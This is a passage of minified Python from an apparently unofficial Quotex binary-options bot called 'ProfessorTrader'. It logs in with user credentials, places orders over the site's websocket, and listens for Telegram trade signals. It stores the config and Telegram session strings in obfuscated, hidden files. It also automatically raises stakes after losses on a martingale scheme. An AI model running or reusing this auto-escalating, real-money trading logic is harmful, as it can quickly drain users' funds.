	B=host;A=previous_context;global g_account_context;g_account_context={_R:name,_Ae:token,'cookies':cookies,_A6:account_type,'host':B,_A5:user_agent,_Dp:f"https://{B}",_Ai:f"wss://ws2.{B}/socket.io/?EIO=3&transport=websocket",_S:_A,_M:0,_e:0,_s:0,_t:_C,_Aj:_A,_Dq:_C,_Ak:'EURUSD',_Al:60,'realtime_price':{},'realtime_candles':_A,'realtime_sentiment':{},'signal_data':{},_O:{_W:_D,_X:_D},'historical_candles':{},'time_sync_server_timestamp':time.time(),'list_info_data':{},'candle_v2_data':{},'settings_list':{},_u:[],_Dr:threading.Lock(),_f:{},_v:1,_A7:time.monotonic(),_A8:_A,_Ds:asyncio.Lock(),_A9:'',_AA:_A}
	if A:g_account_context[_v]=A.get(_v,1);g_account_context[_f]=A.get(_f,{});g_account_context[_O]=A.get(_O,{_W:_D,_X:_D})
def extract_and_process_instruments():
	global g_account_context
	if not g_account_context or _u not in g_account_context or not g_account_context[_u]:return[]
	B=[]
	for A in g_account_context[_u]:
		try:C={_R:A[1],_m:bool(A[14]),_Am:int(A[-9]),_Dt:int(A[-8]),'raw':A};B.append(C)
		except(IndexError,TypeError,ValueError):continue
	return B
async def display_instrument_status(silent=_C):
	global g_account_context
	if silent:return
	async with g_account_context[_Ds]:
		console.print();D=Panel(Text(t(_BA),justify=_K),title=f"[bold green]{t(_B9)}[/bold green]",border_style=_G);console.print(D);C=extract_and_process_instruments()
		if not C:console.print(t(_BB),style=STYLE_WARNING_MSG);return
		C.sort(key=lambda x:(not x[_m],x[_R]));A=Table(title=t(_BC),header_style=_l,expand=_B);A.add_column(t(_BD),style=_J,width=15,no_wrap=_B);A.add_column(t(_BE),justify=_K,style=_AB);A.add_column(t(_BF),justify=_AC,style=_L);A.add_column(t(_BG),justify=_AC,style=_L)
		for B in C:E=Text(t(_BH),style=_Du)if B[_m]else Text(t(_BI),style='dim red');F=f"{B[_Am]}%"if B[_m]else _E;G=f"{B[_Dt]}%"if B[_m]else _E;A.add_row(B[_R],E,F,G)
		console.print(A);console.print()
def extract_trade_data_manually(message_string):
	J='dealid';I={_P:'"id":"([^"]+)"',_F:'"asset":"([^"]+)"',_Q:'"amount":([-]?\\d+\\.?\\d*)',_AD:'"profit":([-]?\\d+\\.?\\d*)',_AE:'"profitAmount":([-]?\\d+\\.?\\d*)',_An:'"openPrice":([-]?\\d+\\.?\\d*)',_AF:'"closePrice":([-]?\\d+\\.?\\d*)',_n:'"command":(\\d+)',_o:'"openTimestamp":(\\d+)',_AG:'"closeTimestamp":(\\d+)','uid':'"uid":(\\d+)',_H:'"result":"([^"]+)"',_Dv:'"requestId":("?[^"]+"?|\\d+)','openTime':'"openTime":"([^"]+)"','closeTime':'"closeTime":"([^"]+)"',_Ao:'"accountBalance":([-]?\\d+\\.?\\d*)','currency':'"currency":"([^"]+)"','purchaseTime':'"purchaseTime":(\\d+)','nickname':'"nickname":"([^"]+)"'};E=[];B=message_string
	if B.startswith('42['):B=B[3:]
	if B.startswith('[')and B.endswith(']')and B.count('{')==1:B=B[1:-1]
	K=re.split('(?<=\\}),(?=\\{)',B)
	for L in K:
		A={}
		for(F,G)in I.items():
			C=re.search(G,L)
			if C:H=C.group(1).strip('"');A[F]=H
		if _n in A:
			try:D=int(A[_n]);A[_I]=_AH if D==0 else'put'if D==1 else _w
			except ValueError:A[_I]=_AI
		if A and(_P in A or J in A):E.append(A)
	if not E and B.strip().startswith('{'):
		A={}
		for(F,G)in I.items():
			C=re.search(G,B)
			if C:H=C.group(1).strip('"');A[F]=H
		if _n in A:
			try:D=int(A[_n]);A[_I]=_AH if D==0 else'put'if D==1 else _w
			except ValueError:A[_I]=_AI
		if A and(_P in A or J in A):E.append(A)
	return E
def get_rich_result_style(result_str):
	B=result_str
	if not B:return STYLE_VALUE_WHITE
	A=B.lower()
	if A==_Y:return STYLE_VALUE_CYAN
	elif A==_Z:return STYLE_VALUE_RED
	elif A==_g:return STYLE_VALUE_YELLOW
	return STYLE_VALUE_WHITE
def recalculate_result_if_needed(trade_info_dict):
	A=trade_info_dict;F=A.get(_An);G=A.get(_AF);C=A.get(_I);I=A.get(_H);B=_A
	if F and G and C and C not in[_w,_AI]:
		try:
			D,E=float(F),float(G)
			if C==_AH:
				if E>D:B=_Y
				elif E<D:B=_Z
				else:B=_g
			elif C=='put':
				if E<D:B=_Y
				elif E>D:B=_Z
				else:B=_g
		except(ValueError,TypeError):pass
	if B:A[_H]=B
	elif not I:
		J=A.get(_AE,A.get(_AD,'0.0'))
		try:
			H=float(J)
			if H>0:A[_H]=_Y
			elif H<0:A[_H]=_Z
			else:A[_H]=_g
		except(ValueError,TypeError):
			if not A.get(_H):A[_H]='unknown_profit_fmt'
def log_new_trade_opened(assigned_number,trade_data):
	G='%Y-%m-%d %H:%M:%S';B=trade_data;global g_account_context;A=Table(show_header=_C,box=_A,padding=(0,1));A.add_column(style=STYLE_FIELD_NAME,width=18);A.add_column(style=STYLE_VALUE_WHITE);A.add_row(t(_BN),Text(str(B.get(_P)),style=STYLE_VALUE_WHITE));A.add_row(t(_BO),Text(str(B.get(_F)),style=STYLE_VALUE_YELLOW))
	try:A.add_row(t(_AO),Text(f"${float(B.get(_Q,0)):.2f}",style=STYLE_VALUE_YELLOW))
	except(ValueError,TypeError):A.add_row(t(_AO),Text(str(B.get(_Q,_E)),style=STYLE_VALUE_YELLOW))
	A.add_row(t(_BP),Text(str(B.get(_I,_E)).upper(),style=STYLE_VALUE_WHITE));C=B.get(_o);D=_E
	if C:
		try:D=datetime.fromtimestamp(int(C)).strftime(G)
		except:pass
	A.add_row(t(_BQ),Text(D,style=STYLE_VALUE_WHITE));E=B.get(_AG);F=_E
	if E:
		try:F=datetime.fromtimestamp(int(E)).strftime(G)
		except:pass
	A.add_row(t(_BR),Text(F,style=STYLE_VALUE_WHITE));H=Text.from_markup(t(_BL,number=assigned_number,account=g_account_context[_R]));I=Panel(A,title=t(_BM,title=H),border_style=_G,expand=_C);console.print(I)
def log_trade_result(assigned_number,trade_data):
	B=trade_data;global g_account_context;A=Table(show_header=_C,box=_A,padding=(0,1));A.add_column(style=STYLE_FIELD_NAME,width=20);A.add_column(style=STYLE_VALUE_WHITE);D=str(B.get(_H,_E));E=B.get(_Q);G=B.get(_AE,B.get(_AD));A.add_row(t(_BU),Text(str(B.get(_P)),style=STYLE_VALUE_WHITE));A.add_row(t(_BV),Text(str(B.get(_F)),style=STYLE_VALUE_YELLOW));A.add_row(t(_BW),Text(D.upper(),style=get_rich_result_style(D)))
	try:A.add_row(t(_AP),Text(f"${float(E):.2f}",style=STYLE_VALUE_YELLOW))
	except(ValueError,TypeError,AttributeError):A.add_row(t(_AP),Text(str(E or _E),style=STYLE_VALUE_YELLOW))
	try:
		H=float(E);C=_D
		if D.lower()==_Y:N=float(G);C=N-H
		elif D.lower()==_Z:C=-H
		O=STYLE_VALUE_GREEN if C>0 else STYLE_VALUE_RED if C<0 else STYLE_VALUE_YELLOW;A.add_row(t(_AQ),Text(f"${C:+.2f}",style=O))
	except(ValueError,TypeError,AttributeError):A.add_row(t(_AQ),Text(str(G or _E),style=STYLE_VALUE_WHITE))
	I,J=B.get(_o),B.get(_AG);K,L=_E,_E
	if I:
		try:K=datetime.fromtimestamp(int(I)).strftime(_Ap)
		except:pass
	if J:
		try:L=datetime.fromtimestamp(int(J)).strftime(_Ap)
		except:pass
	A.add_row(t(_BX),Text(f"{K} / {B.get(_An,_E)}",style=STYLE_VALUE_WHITE));A.add_row(t(_BY),Text(f"{L} / {B.get(_AF,_E)}",style=STYLE_VALUE_WHITE));F=B.get(_Ao)
	if F is not _A:
		try:M=float(F);P=_W if g_account_context[_A6]==0 else _X;g_account_context[_O][P]=M;A.add_row(t(_AR),Text(f"${M:.2f}",style=STYLE_VALUE_GREEN))
		except ValueError:A.add_row(t(_AR),Text(str(F),style=STYLE_VALUE_WHITE))
	Q=Text.from_markup(t(_BS,number=assigned_number,account=g_account_context[_R]));R=Panel(A,title=t(_BT,title=Q),border_style=_U,expand=_C);console.print(R)
def on_message_callback_global(ws,message):
	m='original_data';l='Unknown';E=message;global g_account_context,g_buy_id,g_buy_successful,mtg_state,g_event_loop,trade_stats,SHOW_RAW_WEBSOCKET_DATA,shutdown_event,session_trade_log
	if not g_account_context:return
	if SHOW_RAW_WEBSOCKET_DATA:
		try:
			Q=E.decode(_p,errors=_q)if isinstance(E,bytes)else str(E)
			try:
				R=re.sub('^\\d+','',Q)
				if R.startswith('[')and R.endswith(']'):n=json.loads(R);S=json.dumps(n,indent=2)
				else:S=Q
			except(json.JSONDecodeError,TypeError):S=Q
			console.print(Panel(Text(S,overflow='fold'),title=f"[dim blue]{t(_BK)}[/dim blue]",border_style='dim blue',expand=_C))
		except Exception as T:console.print(t(_BJ,e=T),style=STYLE_ERROR)
	try:
		g_account_context[_A7]=time.monotonic();o=isinstance(E,bytes);K=E
		if o and E.startswith(b'\x04'):K=E[1:]
		F=K.decode(_p,errors=_q)if isinstance(K,bytes)else str(K);p=g_account_context.get(_A9,'')
		if F.startswith('451-["instruments/list"'):g_account_context[_A9]=F;return
		if p=='451-["instruments/list",{"_placeholder":true,"num":0}]':
			g_account_context[_A9]=''
			try:
				L=json.loads(F)
				if isinstance(L,list)and len(L)>0 and isinstance(L[0],list):g_account_context[_u]=L;g_account_context[_Dq]=_B;return
			except(json.JSONDecodeError,IndexError,TypeError):pass
		if isinstance(E,(str,bytes)):
			a=E if isinstance(E,bytes)else E.encode(_p)
			if b'authorization/reject'in a:g_account_context[_e]=1;return
			elif b's_authorization'in a:g_account_context[_s]=1;g_account_context[_e]=0
		C=_A
		if isinstance(F,str)and F.startswith('42'):
			try:C=json.loads(F[2:])
			except json.JSONDecodeError:pass
		elif isinstance(F,str)and F.strip().startswith('{'):
			try:C=json.loads(F)
			except json.JSONDecodeError:pass
		b=extract_trade_data_manually(F)
		if b:
			for D in b:
				G=D.get(_P)
				if not G:continue
				U,c=_C,_C;I=D.get(_AF);d=all(A in D for A in[_F,_o,_n,_Q])
				if I is not _A:
					try:
						if float(I)==_D and not D.get(_H)and d:U=_B
					except ValueError:pass
				elif not D.get(_H)and D.get(_o)and not I and d:U=_B
				if D.get(_H)in[_Y,_Z,_g]or I and I!='0':c=_B;recalculate_result_if_needed(D)
				if U and G not in g_account_context[_f]:g_buy_id,g_buy_successful=G,D;J=g_account_context[_v];V=g_account_context.get(_AA,l);g_account_context[_AA]=_A;g_account_context[_f][G]={_AJ:J,m:dict(D),_a:V};g_account_context[_v]+=1;log_new_trade_opened(J,D)
				elif c and G in g_account_context[_f]:
					W=g_account_context[_f].pop(G);J=W[_AJ];V=W.get(_a,l);B={**W[m],**D};recalculate_result_if_needed(B);H=B.get(_H);q=B.get(_AE,B.get(_AD));M=B.get(_Q);A=B.get(_F);e=B.get(_Ao);trade_stats[_V]+=1;X=_D
					try:
						r=float(M)
						if H==_Y:
							trade_stats[_i]+=1
							if A and mtg_state.get(A,{}).get(_T,0)==0:trade_stats[_Aa]+=1
							f=float(q)-r;trade_stats[_j]+=f;X=f
						elif H==_Z:trade_stats[_A0]+=1;g=float(M);trade_stats[_j]-=g;X=-g
						elif H==_g:trade_stats[_AZ]+=1
					except(ValueError,TypeError,AttributeError):pass
					session_trade_log.append({_AJ:J,_a:V,_F:A,_I:B.get(_I,_w),_Q:float(M)if M else _D,_H:H,'pnl':X})
					if e is not _A:
						try:trade_stats[_k]=float(e)
						except(ValueError,TypeError):pass
					if USE_MTG:
						if A:
							mtg_state.setdefault(A,{_T:0,_b:TRADE_AMOUNT});h=mtg_state[A][_T]
							if H==_Z:
								mtg_state[A][_b]=float(B.get(_Q,mtg_state[A][_b]))
								if h<MTG_MAX_LEVELS:
									mtg_state[A][_T]+=1;s=mtg_state[A][_T];i=mtg_state[A][_b];Y=round(i*MTG_MULTIPLIER,2);mtg_state[A][_b]=Y;u=Panel(Text(t(_Ba,level=s,max_levels=MTG_MAX_LEVELS,losing_amount=i,new_amount=Y),justify='left'),title=f"[bold yellow]{t(_BZ,asset=A)}[/bold yellow]",border_style=_L,expand=_C);console.print(u);N=B.get(_I);j=B.get(_o);k=B.get(_AG)
									if N and N not in[_w,_AI]and j and k:
										try:
											O=int(k)-int(j)
											if O>0:
												console.print(Text(t(_Bb,direction=N.upper(),duration=O),style=STYLE_INFO_MSG));v=buy_option_func(amount=Y,source_account_type=SOURCE_ACCOUNT_TYPE,asset=A,direction=N,duration=O)
												if g_event_loop and g_event_loop.is_running():asyncio.run_coroutine_threadsafe(v,g_event_loop)
												else:console.print(Text(t(_Bc),style=STYLE_ERROR_MSG))
											else:console.print(Text(t(_Bd,duration=O),style=STYLE_WARNING_MSG))
										except(ValueError,TypeError)as T:console.print(Text(t(_Be,e=T),style=STYLE_ERROR_MSG))
									else:console.print(Text(t(_Bf),style=STYLE_WARNING_MSG))
								else:console.print(Text(t(_Bg,max_levels=MTG_MAX_LEVELS,asset=A),style=STYLE_ERROR_MSG));mtg_state[A][_T]=0;mtg_state[A][_b]=TRADE_AMOUNT
							elif H in[_Y,_g]:
								if h>0:console.print(Text(t(_Bh,asset=A),style=STYLE_SUCCESS_MSG));mtg_state[A][_T]=0;mtg_state[A][_b]=TRADE_AMOUNT
					log_trade_result(J,B)
					if not shutdown_event.is_set():
						P=trade_stats[_j]
						if STOP_PROFIT>0 and P>=STOP_PROFIT:console.print(Panel(Text(t(_Bj,target=STOP_PROFIT,pnl=P),justify=_K,style=_Du),title=f"[bold green]{t(_Bi)}[/bold green]",border_style=_G));shutdown_event.set()
						elif STOP_LOSS>0 and P<=-STOP_LOSS:console.print(Panel(Text(t(_Bl,limit=STOP_LOSS,pnl=P),justify=_K,style='bold red'),title=f"[bold red]{t(_Bk)}[/bold red]",border_style=_N));shutdown_event.set()
		if C:
			if isinstance(C,dict)and(C.get(_W)is not _A or C.get(_X)is not _A):g_account_context[_O].update(C)
			elif isinstance(C,list)and len(C)>1 and isinstance(C[1],dict):
				w,Z=C[0],C[1]
				if w=='balance'and(Z.get(_W)is not _A or Z.get(_X)is not _A):g_account_context[_O].update(Z)
		if F=='41':g_account_context[_M]=0;return
	except Exception:pass
def on_error_callback_global(ws,error):
	global g_account_context
	if not g_account_context:return
	g_account_context[_Aj]=str(error);g_account_context[_t]=_B;g_account_context[_M]=0
def on_open_callback_global(ws):
	global g_account_context
	if not g_account_context:return
	g_account_context[_M]=1;g_account_context[_t]=_C;g_account_context[_Aj]=_A;g_account_context[_e]=0;g_account_context[_s]=0;g_account_context[_A7]=time.monotonic();send_ssid_auth();A=g_account_context.get(_Ak,'EURUSD');B=g_account_context.get(_Al,60);C=['42["tick"]','42["indicator/list"]','42["drawing/load"]','42["pending/list"]',f'42["instruments/update",{{"asset":"{A}","period":{int(B)}}}]',f'42["depth/follow","{A}"]','42["chart_notification/get"]']
	for D in C:
		try:send_websocket_request(D)
		except Exception:pass
def on_close_callback_global(ws,close_status_code,close_msg):
	global g_account_context
	if not g_account_context:return
	if g_account_context.get(_e,0)!=1:0
	g_account_context[_M]=0
def on_ping_callback_global(ws,ping_msg):0
def on_pong_callback_global(ws,pong_msg):
	try:send_websocket_request('2')
	except Exception:pass
def send_websocket_request(data):
	global g_account_context
	if not g_account_context:return
	with g_account_context[_Dr]:
		if g_account_context.get(_S)and g_account_context[_S].sock and g_account_context[_S].sock.connected:
			try:g_account_context[_S].send(data)
			except websocket.WebSocketConnectionClosedException:g_account_context[_M]=0
			except Exception:g_account_context[_M]=0
def send_ssid_auth():
	global g_account_context
	if not g_account_context:return
	A={_Ah:g_account_context[_Ae],'isDemo':g_account_context[_A6],_Dw:0};B=f'42["authorization",{json.dumps(A)}]';send_websocket_request(B)
async def get_balance_for_account():
	global g_account_context
	if not g_account_context:return _D
	send_websocket_request('42["balance/get"]');E=time.monotonic()
	while time.monotonic()-E<5:
		B=g_account_context[_O].get(_W);C=g_account_context[_O].get(_X)
		if B is not _A and B>=_D or C is not _A and C>=_D:break
		await asyncio.sleep(.0005)
	A=g_account_context[_O]
	if A:
		D=A.get(_X)if g_account_context[_A6]==1 else A.get(_W)
		if D is not _A:
			try:return float(f"{D:.2f}")
			except(TypeError,ValueError):return _D
	return _D
def run_websocket_for_account():
	global g_account_context
	if not g_account_context:return
	B=urlparse(g_account_context[_Ai]);C=B.hostname;D=g_account_context[_Ai];E={'cert_reqs':ssl.CERT_REQUIRED,'ca_certs':cacert,'ssl_context':ssl_context}if cacert else{}
	try:A=websocket.WebSocketApp(D,on_message=on_message_callback_global,on_error=on_error_callback_global,on_close=on_close_callback_global,on_open=on_open_callback_global,on_ping=on_ping_callback_global,on_pong=on_pong_callback_global,header={_Ab:g_account_context[_A5],'Origin':g_account_context[_Dp],'Host':C,'Cookie':g_account_context['cookies']});g_account_context[_S]=A;A.run_forever(ping_interval=3,ping_timeout=2,ping_payload='2',sslopt=E,reconnect=1)
	finally:0
async def connect_and_authenticate_account():
	global g_account_context
	if not g_account_context:return _C
	g_account_context.update({_M:0,_s:0,_e:0,_t:_C});A=threading.Thread(target=run_websocket_for_account,daemon=_B);A.start();B,C=time.monotonic(),15
	while time.monotonic()-B<C:
		if g_account_context.get(_M)==1:break
		if g_account_context.get(_t):return _C
		await asyncio.sleep(.0001)
	else:return _C
	D,E=time.monotonic(),10
	while time.monotonic()-D<E:
		if g_account_context.get(_s)==1:return _B
		if g_account_context.get(_e)==1 or g_account_context.get(_M)==0:return _C
		await asyncio.sleep(.0001)
	return _C
def close_connection_for_account():
	global g_account_context
	if not g_account_context:return
	A=g_account_context.get(_S)
	if A:
		A.keep_running=_C
		try:
			if A.sock and A.sock.connected:A.close()
		except Exception:pass
	g_account_context[_S]=_A;g_account_context[_M]=0
def get_expiration_time_quotex(timestamp,duration):
	A=duration;A=max(A,60);B=(A+59)//60;C=datetime.fromtimestamp(timestamp);E=C.minute;F=E%B;G=E-F;H=C.replace(minute=G,second=0,microsecond=0);D=H+timedelta(minutes=B)
	if(D-C).total_seconds()<30:D+=timedelta(minutes=B)
	return int(time.mktime(D.timetuple()))
def is_websocket_connected():global g_account_context;return g_account_context.get(_M)==1 if g_account_context else _C
async def buy_option_func(amount,source_account_type,asset,direction,duration):
	M='graph';L='chartId';K='_otc';E=amount;D=asset;B=duration;global g_account_context;N=int(time.time()*1000);A=re.sub('_OTC$',K,D,flags=re.IGNORECASE)
	if not is_websocket_connected():console.print(Text(t(_Bm,asset=D),style=STYLE_ERROR_MSG));return
	C=g_account_context[_S];g_account_context[_Ak]=A;g_account_context[_Al]=B;C.send(f'42["instruments/update", {json.dumps({_F:A,"period":B})}]');C.send(f'42["chart_notification/get", {json.dumps({_F:A,"version":"1.0.0"})}]');C.send(f'42["depth/follow", {json.dumps(A)}]')
	if A.endswith(K):F,G,H,I=100,B,int(time.time())+B,_C
	else:J=get_expiration_time_quotex(int(time.time()),B);F,G,H,I=1,J,J,_B
	O={L:M,'settings':{L:M,'chartType':2,'currentExpirationTime':H,'isFastOption':I,'isFastAmountOption':_C,'isIndicatorsMinimized':_C,'isIndicatorsShowing':_B,'isShortBetElement':_C,'chartPeriod':4,'currentAsset':{'symbol':A},'dealValue':E,'dealPercentValue':1,'isVisible':_B,'isAutoScrolling':1,'isOneClickTrade':_B,'upColor':'#0FAF59','downColor':'#FF6251'}};C.send(f'42["settings/store",{json.dumps(O)}]');P={_F:A,_Q:E,'time':G,'action':direction,'isDemo':source_account_type,_Dw:0,_Dv:str(N),'optionType':F};C.send(f'42["orders/open",{json.dumps(P)}]');console.print(Text(t(_Bn,asset=D),style=STYLE_INFO_MSG))
def load_config():
	try:
		with open(CONFIG_FILE,'r')as B:
			A=B.read()
			if not A:return{}
			C=deobfuscate_data(A);return json.loads(C)
	except(FileNotFoundError,json.JSONDecodeError,Exception):return{}
def save_config(config_data):
	A=json.dumps(config_data,indent=4);B=obfuscate_data(A)
	with open(CONFIG_FILE,'w')as C:C.write(B)
	hide_file(CONFIG_FILE)
def get_input_with_default(prompt,default_value=_A,is_password=_C):
	C=is_password;A=default_value;B=f" │ {prompt}"
	if A is not _A and A!=''and not C:B+=f" [dim](default: {A})[/dim]"
	B+=': ';D=Text.from_markup(B,style=_J)
	if C:return get_password(D)
	E=console.input(D);F=E.strip()if E.strip()!=''else A;return F if F is not _A else''
def get_user_credentials():
	R='stop_loss';Q='stop_profit';P='mtg_max_levels';O='mtg_multiplier';N='use_mtg';M='min_payout';L='trade_amount';K='source_account_type';J='user_email';C='dim cyan';B='─';global USER_EMAIL,USER_PASSWORD,SOURCE_ACCOUNT_TYPE,TRADE_AMOUNT,MIN_PAYOUT,USE_MTG,MTG_MULTIPLIER,MTG_MAX_LEVELS,SHOW_RAW_WEBSOCKET_DATA,STOP_PROFIT,STOP_LOSS;console.clear();show_banner();A=load_config();S=Panel(Text(t(_Bq),justify=_K,style=_d),title=f"[bold cyan]{t(_Bp)}[/bold cyan]",border_style=_J,padding=(1,2));console.print(S);USER_EMAIL=get_input_with_default(f"📧 {t(_Br)}",A.get(J,''));USER_PASSWORD=get_input_with_default(f"🔑 {t(_Bs)}",is_password=_B);T=str(A.get(K,1));U=f"🏦 {t(_Bt)}";V=get_input_with_default(U,T);SOURCE_ACCOUNT_TYPE=0 if V=='0'else 1;console.print(Text(t(_Bu)if SOURCE_ACCOUNT_TYPE==0 else t(_Bv),style=STYLE_INFO_MSG));console.print(Text(B*60,style=C))
	while _B:
		try:
			W=str(A.get(L,1.));X=get_input_with_default(f"💵 {t(_Bw)}",W);D=float(X)
			if D<=0:console.print(Text(t(_Bx),style=STYLE_ERROR_MSG));continue
			TRADE_AMOUNT=D;break
		except ValueError:console.print(Text(t(_r),style=STYLE_ERROR_MSG))
	while _B:
		try:
			Y=str(A.get(M,70));Z=get_input_with_default(f"📈 {t(_By)}",Y);E=int(Z)
			if not 0<=E<=100:console.print(Text(t(_Bz),style=STYLE_ERROR_MSG));continue
			MIN_PAYOUT=E;break
		except ValueError:console.print(Text(t(_AS),style=STYLE_ERROR_MSG))
	console.print(Text(B*60,style=C));a='y'if A.get(N,_C)else'n';b=get_input_with_default(f"💸 {t(_B_)}",a).strip().lower()
	if b=='y':
		USE_MTG=_B;console.print(Text(t(_C0),style=STYLE_INFO_MSG))
		while _B:
			try:
				c=str(A.get(O,2.));d=get_input_with_default(t(_C1),c);F=float(d)
				if F<=1.:console.print(Text(t(_C2),style=STYLE_ERROR_MSG));continue
				MTG_MULTIPLIER=F;break
			except ValueError:console.print(Text(t(_r),style=STYLE_ERROR_MSG))
		while _B:
			try:
				e=str(A.get(P,2));f=get_input_with_default(t(_C3),e);G=int(f)
				if G<1:console.print(Text(t(_C4),style=STYLE_ERROR_MSG));continue
				MTG_MAX_LEVELS=G;break
			except ValueError:console.print(Text(t(_AS),style=STYLE_ERROR_MSG))
		console.print(Text(t(_C5,multiplier=MTG_MULTIPLIER,levels=MTG_MAX_LEVELS),style=STYLE_SUCCESS))
	else:USE_MTG=_C;console.print(Text(t(_C6),style=STYLE_INFO_MSG))
	console.print(Text(B*60,style=C));console.print(Text(f"🎯 {t(_C7)}",style=STYLE_HEADER))
	while _B:
		try:
			g=str(A.get(Q,_D));h=get_input_with_default(f"💰 {t(_C8)}",g);H=float(h)
			if H<0:console.print(Text(t(_C9),style=STYLE_ERROR_MSG));continue
			STOP_PROFIT=H;break
		except ValueError:console.print(Text(t(_r),style=STYLE_ERROR_MSG))
	while _B:
		try:
			i=str(A.get(R,_D));j=get_input_with_default(f"🛑 {t(_CA)}",i);I=float(j)
			if I<0:console.print(Text(t(_CB),style=STYLE_ERROR_MSG));continue
			STOP_LOSS=I;break
		except ValueError:console.print(Text(t(_r),style=STYLE_ERROR_MSG))
	if STOP_PROFIT>0:console.print(Text(t('sp_set',amount=STOP_PROFIT),style=STYLE_SUCCESS_MSG))
	else:console.print(Text(t(_CC),style=STYLE_INFO_MSG))
	if STOP_LOSS>0:console.print(Text(t('sl_set',amount=STOP_LOSS),style=STYLE_SUCCESS_MSG))
	else:console.print(Text(t(_CD),style=STYLE_INFO_MSG))
	console.print(Text(B*60,style=C));SHOW_RAW_WEBSOCKET_DATA=_C;A.update({J:USER_EMAIL,K:SOURCE_ACCOUNT_TYPE,L:TRADE_AMOUNT,M:MIN_PAYOUT,N:USE_MTG,O:MTG_MULTIPLIER,P:MTG_MAX_LEVELS,'show_raw_data':SHOW_RAW_WEBSOCKET_DATA,Q:STOP_PROFIT,R:STOP_LOSS});save_config(A);console.print(Text(t(_Bo)));console.print()
async def check_internet_connection():
	try:B,A=await asyncio.wait_for(asyncio.open_connection('8.8.8.8',53),timeout=3);A.close();await A.wait_closed();return _B
	except(OSError,asyncio.TimeoutError):return _C
async def connection_monitor():
	global g_account_context;A,B=5,3
	if g_account_context:0
	while _B:
		try:
			await asyncio.sleep(B)
			if not g_account_context or not is_websocket_connected():break
			C=time.monotonic()-g_account_context.get(_A7,0)
			if C>A:g_account_context[_M]=0;break
		except asyncio.CancelledError:break
		except Exception:break
async def run_quotex_connection(status):
	A=status;global g_account_context,USER_EMAIL,USER_PASSWORD,trade_stats,shutdown_event;C=_B;F=3
	while not shutdown_event.is_set():
		if not is_websocket_connected():
			if g_account_context and g_account_context.get(_A8):g_account_context[_A8].cancel()
			close_connection_for_account()
			if not C:
				A.update(format_status_message(t(_CG)))
				if not await check_internet_connection():
					A.update(format_status_message(t(_CH)))
					while not await check_internet_connection():
						if shutdown_event.is_set():break
						await asyncio.sleep(1)
					if shutdown_event.is_set():break
				G=_C
				for H in range(F):
					I=t(_CE,attempt=H+1,max_attempts=F);A.update(format_status_message(I))
					if await connect_and_authenticate_account():G=_B;break
					await asyncio.sleep(3)
				if G:
					A.update(format_status_message(t(_AT)));B=await get_balance_for_account()
					if B is not _A and B>=0:trade_stats[_k]=B
					continue
			if C:A.update(format_status_message(t(_CF)))
			else:A.update(format_status_message(t(_AU)))
			if not USER_PASSWORD:console.print(t(_CI));await asyncio.sleep(10);continue
			D=await quotex_login(USER_EMAIL,USER_PASSWORD,lang=_c,status=A)
			if D[_A2]:
				J=g_account_context.copy()if g_account_context else _A;initialize_global_account_context(name=_Dx,token=D[_A3],cookies=D[_A4],account_type=SOURCE_ACCOUNT_TYPE,previous_context=J)
				if await connect_and_authenticate_account():
					A.update(format_status_message(t(_AT)));B=await get_balance_for_account()
					if B is not _A and B>=0:
						trade_stats[_k]=B
						if C:trade_stats[_A1]=B
					C=_C
				else:A.update(format_status_message(t(_AV)));await asyncio.sleep(5)
			else:A.update(format_status_message(t(_AV)));await asyncio.sleep(5)
			continue
		K=t(_CJ);E=asyncio.create_task(connection_monitor());g_account_context[_A8]=E
		while not E.done()and not shutdown_event.is_set():A.update(format_status_message(K));await asyncio.sleep(1)
		try:await E
		except asyncio.CancelledError:pass
		await asyncio.sleep(.01)
def show_banner():
	os.system('cls'if os.name=='nt'else'clear')
	try:A=os.get_terminal_size().columns-10
	except OSError:A=80
	B=[t(_At),t(_Au),t(_Av),t(_Aw),t(_Ax),t(_Ay)];C=pyfiglet.figlet_format('ProfessorTrader',font='standard',width=A,justify=_K);D=random.choice(B);E=Text(C,style=_l,justify=_K);F=Text(f"\n» {D} «\n",style=_J,justify=_K);G=Text(t(_Az),style='dim',justify=_K);H=Panel(Text.assemble(E,F,G),border_style=_U,expand=_C,padding=(1,4));console.print(H);console.print()
class TelegramSignalListener:
	def __init__(A):A.config={};A.telegram_client=_A;A.running=_C;A.print_lock=asyncio.Lock();A.signals_lock=asyncio.Lock();A.pending_signals=[];A.TIMEZONE=ZoneInfo('Etc/GMT+7');A.reconnect_event=asyncio.Event();A.monitoring_task=_A
	FONT_MAP={'𝙰':'A','𝙱':'B','𝙲':'C','𝙳':'D','𝙴':'E','𝙵':'F','𝙶':'G','𝙷':'H','𝙸':'I','𝙹':'J','𝙺':'K','𝙻':'L','𝙼':'M','𝙽':'N','𝙾':'O','𝙿':'P','𝚀':'Q','𝚁':'R','𝚂':'S','𝚃':'T','𝚄':'U','𝚅':'V','𝚆':'W','𝚇':'X','𝚈':'Y','𝚉':'Z','𝚊':'a','𝚋':'b','𝚌':'c','𝚍':'d','𝚎':'e','𝚏':'f','𝚐':'g','𝚑':'h','𝚒':'i','𝚓':'j','𝚔':'k','𝚕':'l','𝚖':'m','𝚗':'n','𝚘':'o','𝚙':'p','𝚚':'q','𝚛':'r','𝚜':'s','𝚝':'t','𝚞':'u','𝚟':'v','𝚠':'w','𝚡':'x','𝚢':'y','𝚣':'z','𝟶':'0','𝟷':'1','𝟸':'2','𝟹':'3','𝟺':'4','𝟻':'5','𝟼':'6','𝟽':'7','𝟾':'8','𝟿':'9'}
	def normalize_text(B,text):return''.join(B.FONT_MAP.get(A,A)for A in text)
	async def safe_print(A,content,**B):
		async with A.print_lock:console.print(content,**B)
	def load_sessions(D):
		try:
			with open(SESSIONS_FILE,'r')as B:
				A=B.read()
				if not A:return{}
				C=deobfuscate_data(A);return json.loads(C)
		except(FileNotFoundError,json.JSONDecodeError,Exception):return{}
	def save_session(B,phone,session_string):
		A=B.load_sessions();A[phone]=session_string;C=json.dumps(A,indent=4);D=obfuscate_data(C)
		with open(SESSIONS_FILE,'w')as E:E.write(D)
		hide_file(SESSIONS_FILE)
	def get_mobile_input(F,prompt,is_password=_C,default_value=''):
		C=is_password;A=default_value;B=f" │ {prompt}"
		if A and not C:B+=f" [dim](default: {A})[/dim]"
		B+=': ';D=Text.from_markup(B,style=_J)
		if C:return get_password(D)
		E=console.input(D);return E.strip()if E.strip()!=''else A
	def show_api_help(C):A=Text.from_markup(t(_CO));B=Panel(A,title=f"[bold magenta]{t(_CN)}[/bold magenta]",border_style=_U,expand=_C);console.print(B);console.print()
